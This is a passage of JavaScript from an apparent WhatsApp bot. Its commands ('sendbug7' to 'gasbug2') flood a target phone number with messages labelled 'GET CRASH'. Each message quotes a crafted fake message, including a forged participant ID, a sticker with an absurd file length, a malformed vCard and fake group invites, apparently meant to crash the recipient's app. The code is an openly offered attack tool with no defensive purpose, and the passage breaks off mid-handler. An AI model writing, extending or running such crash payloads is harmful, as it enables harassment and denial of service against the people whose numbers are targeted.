haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko})
await m.reply(`Succes`)
break
case 'sendbug7':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let foncevid = { 
key: {
fromMe: false, 
remoteJid: "6285814480623@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid})
await m.reply(`Succes`)
break
case 'sendbug8':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fonceimg = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg})
await m.reply(`Succes`)
break
case 'sendbug9':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fgc = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc})
await m.reply(`Succes`)
break
case 'sendbug10':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let stic = { 
"key": {
"participant": `6285814480623@s.whatsapp.net`,
"remoteJid": "",
"fromMe": false,
"id": "753B96FDB5F5EDF34BF64EC9095C9F8A"
},
"message": {
"stickerMessage": {
"fileSha256": "oC/LRMo7+iJN2AtYvhvIYRYLWR4NPmFlMvib5HQET7I=",
"pngThumbnail": fs.readFileSync(`./pict.jpg`), 
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "https://mmg.whatsapp.net/d/f/AnyaZPBHxD2w7tJkGh-OmppuLyXIAeuBwBoFb2wwYTOM.enc",
"fileLength": "99999999999",
"firstFrameLength": 3626,
"isAnimated": false
}
},
"messageTimestamp": "1614070775",
"status": "PENDING"
 }
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:stic})
 await m.reply(`Succes`)
break 
case 'gasdeck':
if (!text) throw `Nomernya?`
let fkon = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "contactMessage": { 
"displayName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
 "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fkon})
await m.reply(`Succes`)
break
case 'gasbro':
if (!text) throw `Nomernya?`
let finv = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"groupInviteMessage": {
"groupJid": "6288213840883-1616169743@g.us",
"inviteCode": `ith6ffr68`,
"groupName": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
'jpegThumbnail': thumb
}
}
}
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:finv})
await m.reply(`Succes`)
break
case 'gasbug1':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fdoc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
documentMessage: {
title: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
jpegThumbnail: fs.readFileSync(`./pict.jpg`),
}
}
} 
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fdoc1})
await m.reply(`Succes`)
break
case 'gasbug2':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let foto1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`, 
"jpegThumbnail": thumb
} 
} 
}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
